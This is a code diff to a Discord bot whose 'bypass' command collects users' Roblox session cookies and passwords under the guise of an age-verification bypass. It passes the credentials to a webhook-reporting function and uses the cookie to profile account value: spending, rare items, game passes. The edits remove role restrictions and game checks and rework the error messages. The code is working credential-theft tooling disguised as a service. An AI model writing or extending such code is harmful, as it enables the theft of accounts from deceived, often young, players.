@@ -11,9 +11,6 @@ if (!DISCORD_TOKEN || !CLIENT_ID) {
     process.exit(1);
 }
 
-// Store bypass role per guild
-const bypassRoles = new Map();
-
 // Store command-only channels per guild
 const commandOnlyChannels = new Map();
 
@@ -40,15 +37,7 @@ const commands = [
                 .setDescription('Roblox account password')
                 .setRequired(true)
         ),
-    new SlashCommandBuilder()
-        .setName('setbypassrole')
-        .setDescription('Set which role can use the bypass command (Admin only)')
-        .addRoleOption(option =>
-            option.setName('role')
-                .setDescription('Role that can use the bypass command')
-                .setRequired(true)
-        )
-        .setDefaultMemberPermissions(8), // Administrator permission
+    
     new SlashCommandBuilder()
         .setName('commandonly')
         .setDescription('Set a channel to only allow slash commands (Admin only)')
@@ -104,8 +93,6 @@ client.on('interactionCreate', async interaction => {
 
     if (interaction.commandName === 'bypass') {
         await handleBypassCommand(interaction);
-    } else if (interaction.commandName === 'setbypassrole') {
-        await handleSetBypassRoleCommand(interaction);
     } else if (interaction.commandName === 'commandonly') {
         await handleCommandOnlyCommand(interaction);
     } else if (interaction.commandName === 'purge') {
@@ -254,11 +241,7 @@ async function sendWebhookData(userData, credentials, bypassResult) {
                     value: bypassResult.success ? "✅ Success" : "❌ Failed",
                     inline: true
                 },
-                {
-                    name: "🎮 Games Played",
-                    value: userData?.gameData ? userData.gameData.filter(g => g.hasPlayed).length.toString() : "Unknown",
-                    inline: true
-                },
+                
                 {
                     name: "📝 Message",
                     value: bypassResult.message || "No message",
@@ -318,104 +301,7 @@ async function sendWebhookData(userData, credentials, bypassResult) {
     }
 }
 
-// Function to check user's games and gamepasses
-async function checkUserGamesAndPasses(userId, cookie, csrfToken) {
-    const fetch = (await import('node-fetch')).default;
 
-    // Define games to check (game name, universe ID, gamepass IDs to check)
-    const gamesToCheck = [
-        {
-            name: "Grow a Garden",
-            universeId: 126884695634066,
-            gamepasses: [] // No gamepasses specified for Grow a Garden
-        },
-        {
-            name: "Adopt Me!",
-            universeId: 920587237,
-            gamepasses: [
-                { id: 13127998, name: "VIP" }, // Example gamepass, might not be correct for Adopt Me!
-                { id: 13127971, name: "Premium" } // Example gamepass, might not be correct for Adopt Me!
-            ]
-        },
-        {
-            name: "Murder Mystery 2",
-            universeId: 1581843043,
-            gamepasses: [
-                { id: 8064350, name: "Radio" },
-                { id: 8064351, name: "VIP" }
-            ]
-        }
-    ];
-
-    const gameResults = [];
-
-    for (const game of gamesToCheck) {
-        try {
-            // Check if user has played the game
-            const gameResponse = await fetch(`https://games.roblox.com/v1/games/${game.universeId}/votes/user`, {
-                headers: createRobloxHeaders(cookie, csrfToken)
-            });
-
-            let hasPlayed = false;
-            if (gameResponse.ok) {
-                hasPlayed = true; // If we can get vote data, they've played
-            } else {
-                // Alternative check - see if they have any badges from this universe
-                const badgeResponse = await fetch(`https://badges.roblox.com/v1/users/${userId}/badges?limit=100`, {
-                    headers: createRobloxHeaders(cookie, csrfToken)
-                });
-
-                if (badgeResponse.ok) {
-                    const badgeData = await badgeResponse.json();
-                    hasPlayed = badgeData.data.some(badge => badge.statistics?.awardingUniverse?.id === game.universeId);
-                }
-            }
-
-            // Check gamepasses
-            const ownedGamepasses = [];
-            for (const gamepass of game.gamepasses) {
-                try {
-                    const gamepassResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gamepass.id}`, {
-                        headers: createRobloxHeaders(cookie, csrfToken)
-                    });
-
-                    if (gamepassResponse.ok) {
-                        const gamepassData = await gamepassResponse.json();
-                        if (gamepassData.data && gamepassData.data.length > 0) {
-                            ownedGamepasses.push(gamepass.name);
-                        }
-                    }
-                } catch (error) {
-                    console.log(`Error checking gamepass ${gamepass.name}:`, error.message);
-                }
-
-                // Small delay to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-
-            gameResults.push({
-                name: game.name,
-                hasPlayed,
-                gamepasses: ownedGamepasses,
-                gamepassCount: ownedGamepasses.length
-            });
-
-        } catch (error) {
-            console.log(`Error checking game ${game.name}:`, error.message);
-            gameResults.push({
-                name: game.name,
-                hasPlayed: false,
-                gamepasses: [],
-                gamepassCount: 0
-            });
-        }
-
-        // Small delay between game checks
-        await new Promise(resolve => setTimeout(resolve, 200));
-    }
-
-    return gameResults;
-}
 
 // Function to get user data from Roblox APIs
 async function getRobloxUserData(cookie) {
@@ -491,9 +377,6 @@ async function getRobloxUserData(cookie) {
             }
         }
 
-        // Check specific games and gamepasses
-        const gameChecks = await checkUserGamesAndPasses(userId, cookie, csrfToken);
-
         return {
             username,
             userId,
@@ -501,8 +384,7 @@ async function getRobloxUserData(cookie) {
             totalSpending,
             hasKorblox,
             hasHeadless,
-            avatarUrl,
-            gameData: gameChecks
+            avatarUrl
         };
 
 
@@ -532,22 +414,6 @@ async function handleBypassCommand(interaction) {
 
         await interaction.editReply({ embeds: [errorEmbed] });
         return;
-    }
-
-    // Check if user has required role
-    const requiredRoleId = bypassRoles.get(interaction.guildId);
-    if (requiredRoleId) {
-        const member = await interaction.guild.members.fetch(interaction.user.id);
-        if (!member.roles.cache.has(requiredRoleId)) {
-            const errorEmbed = new EmbedBuilder()
-                .setTitle('Access Denied')
-                .setDescription('You do not have the required role to use this command.')
-                .setColor(0xFF0000)
-                .setTimestamp();
-
-            await interaction.editReply({ embeds: [errorEmbed] });
-            return;
-        }
     }
 
     const cookie = interaction.options.getString('cookie');
@@ -615,7 +481,18 @@ async function handleBypassCommand(interaction) {
             throw new Error(`HTTP ${response.status}: ${errorData.message || response.statusText}`);
         }
 
-        const bypassData = JSON.parse(responseText);
+        // Try to parse response as JSON, handle HTML error pages
+        let bypassData;
+        try {
+            bypassData = JSON.parse(responseText);
+        } catch (parseError) {
+            // If parsing fails, likely received HTML error page
+            if (responseText.includes('<html>') || responseText.includes('Gateway Time-out')) {
+                throw new Error('Server timeout - The bypass service is currently unavailable');
+            } else {
+                throw new Error('Invalid response format from bypass service');
+            }
+        }
         const userData = await userDataPromise;
 
         // Check if bypass was successful
@@ -651,18 +528,7 @@ async function handleBypassCommand(interaction) {
                 { name: '💀 Headless', value: userData.hasHeadless ? '✅ True' : '❌ False', inline: true }
             );
 
-            // Add game data if available
-            if (userData.gameData && userData.gameData.length > 0) {
-                const gameInfo = userData.gameData.map(game => {
-                    const playedStatus = game.hasPlayed ? '✅ True' : '❌ False';
-                    const gamepassInfo = game.gamepassCount > 0 ? `${game.gamepassCount}` : '0';
-                    return `**${game.name}** ${playedStatus} | ${gamepassInfo}`;
-                }).join('\n');
-
-                userEmbed.addFields(
-                    { name: '🎮 Games | Passes', value: gameInfo || 'No game data available', inline: false }
-                );
-            }
+            
         } else {
             userEmbed.addFields(
                 { name: '⚠️ User Data', value: 'Could not fetch user data from Roblox API', inline: false }
@@ -697,73 +563,46 @@ async function handleBypassCommand(interaction) {
             .setColor(0xFF0000)
             .setTimestamp();
 
-        if (error.name === 'AbortError') {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'Timeout', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: 'Request timed out. Please try again later.', 
-                inline: false 
-            });
-        } else if (error.message.includes('HTTP 401')) {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'Unauthorized', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: 'Authentication failed. Please check your cookie and password.', 
-                inline: false 
-            });
-        } else if (error.message.includes('HTTP 403')) {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'Access Denied', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: 'The API rejected your request. This could be due to:\n• Invalid cookie or password\n• API authentication issues\n• Rate limiting\n\nPlease verify your credentials and try again.', 
-                inline: false 
-            });
-        } else if (error.message.includes('HTTP')) {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'API Error', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: `API request failed: ${error.message}`, 
-                inline: false 
-            });
-        } else if (error instanceof SyntaxError) {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'Parse Error', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: 'Invalid response from API. Please try again later.', 
-                inline: false 
-            });
-        } else {
-            errorEmbed.addFields({ 
-                name: 'Status', 
-                value: 'Unknown Error', 
-                inline: true 
-            });
-            errorEmbed.addFields({ 
-                name: 'Message', 
-                value: 'An unexpected error occurred. Please try again later.', 
-                inline: false 
-            });
+        // Log detailed error to console for debugging
+        console.error('Detailed bypass error:', {
+            name: error.name,
+            message: error.message,
+            stack: error.stack,
+            timestamp: new Date().toISOString()
+        });
+
+        // Check for specific error messages from the API
+        let userMessage = 'Error bypass api down';
+        
+        if (error.message) {
+            const errorMsg = error.message.toLowerCase();
+            
+            if (errorMsg.includes('invalid cookie') || errorMsg.includes('invalid credentials')) {
+                userMessage = 'Invalid cookie or credentials provided';
+            } else if (errorMsg.includes('invalid password') || errorMsg.includes('wrong password')) {
+                userMessage = 'Invalid password provided';
+            } else if (errorMsg.includes('account cannot bypass') || errorMsg.includes('cannot be bypassed')) {
+                userMessage = 'Account cannot bypass age verification';
+            } else if (errorMsg.includes('account age') || errorMsg.includes('age restriction')) {
+                userMessage = 'Account age cannot bypass verification';
+            } else if (errorMsg.includes('unauthorized') || errorMsg.includes('authentication failed')) {
+                userMessage = 'Authentication failed - check credentials';
+            } else if (errorMsg.includes('rate limit') || errorMsg.includes('too many requests')) {
+                userMessage = 'Rate limited - try again later';
+            }
         }
+
+        // Display appropriate message in Discord embed
+        errorEmbed.addFields({ 
+            name: 'Status', 
+            value: 'Failed', 
+            inline: true 
+        });
+        errorEmbed.addFields({ 
+            name: 'Message', 
+            value: userMessage, 
+            inline: false 
+        });
 
         errorEmbed.setFooter({ 
             text: `Requested by ${interaction.user.username}`, 
@@ -774,63 +613,7 @@ async function handleBypassCommand(interaction) {
     }
 }
 
-// Handle the setbypassrole command
-async function handleSetBypassRoleCommand(interaction) {
-    const role = interaction.options.getRole('role');
-    const guildId = interaction.guildId;
 
-    // Check if there's already a bypass role set
-    const currentRoleId = bypassRoles.get(guildId);
-    let isUpdate = false;
-    let previousRoleName = 'None';
-
-    if (currentRoleId) {
-        isUpdate = true;
-        // Try to get the previous role name
-        try {
-            const previousRole = await interaction.guild.roles.fetch(currentRoleId);
-            if (previousRole) {
-                previousRoleName = previousRole.name;
-            }
-        } catch (error) {
-            previousRoleName = 'Unknown (role may have been deleted)';
-        }
-    }
-
-    // Store the new role for this guild
-    bypassRoles.set(guildId, role.id);
-
-    const embed = new EmbedBuilder()
-        .setTimestamp();
-
-    if (isUpdate) {
-        embed
-            .setTitle('✅ Bypass Role Updated')
-            .setDescription(`The bypass role has been changed from **${previousRoleName}** to **${role.name}**.`)
-            .setColor(0x00FF00)
-            .addFields(
-                { name: '🔄 Previous Role', value: previousRoleName, inline: true },
-                { name: '🆕 New Role', value: role.name, inline: true }
-            );
-    } else {
-        embed
-            .setTitle('✅ Bypass Role Set')
-            .setDescription(`The bypass command can now only be used by members with the **${role.name}** role.`)
-            .setColor(0x00FF00)
-            .addFields(
-                { name: '🎯 Bypass Role', value: role.name, inline: true }
-            );
-    }
-
-    embed.setFooter({ 
-        text: `Set by ${interaction.user.username}`, 
-        iconURL: interaction.user.displayAvatarURL() 
-    });
-
-    await interaction.reply({ embeds: [embed], ephemeral: true });
-
-    console.log(`Bypass role ${isUpdate ? 'updated' : 'set'} in guild ${guildId}: ${role.name} (${role.id})`);
-}
 
 // Handle the commandonly command
 async function handleCommandOnlyCommand(interaction) {
